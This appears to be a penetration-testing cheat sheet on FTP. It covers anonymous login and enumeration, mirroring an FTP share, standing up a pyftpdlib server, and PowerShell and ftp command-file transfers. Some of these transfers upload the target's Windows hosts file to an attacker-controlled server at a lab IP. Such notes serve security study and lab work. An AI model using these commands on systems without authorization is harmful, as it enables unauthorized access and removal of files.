```ftp
ftp -p <IP>
```
#### Anonymous Login
```shell
ftp 10.129.14.136
```
```ftp
anonymous
passive
ls
```
#### TSL/SSL encryption
```shell
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
## FTP Downloads
#### Download All Available Files
```shell
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```
#### pyftpdlib
```shell
sudo pip3 install pyftpdlib
```
#### Setting up a Python3 FTP Server
```shell
sudo python3 -m pyftpdlib --port 21
```
#### Transfering Files from an FTP Server Using PowerShell
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
#### Create a Command File for the FTP Client and Download the Target File
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
##### FTP
```ftp
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye
```
## FTP Uploads
```shell
sudo python3 -m pyftpdlib --port 21 --write
```
#### PowerShell Upload File
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
#### Create a Command File for the FTP Client to Upload a File
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
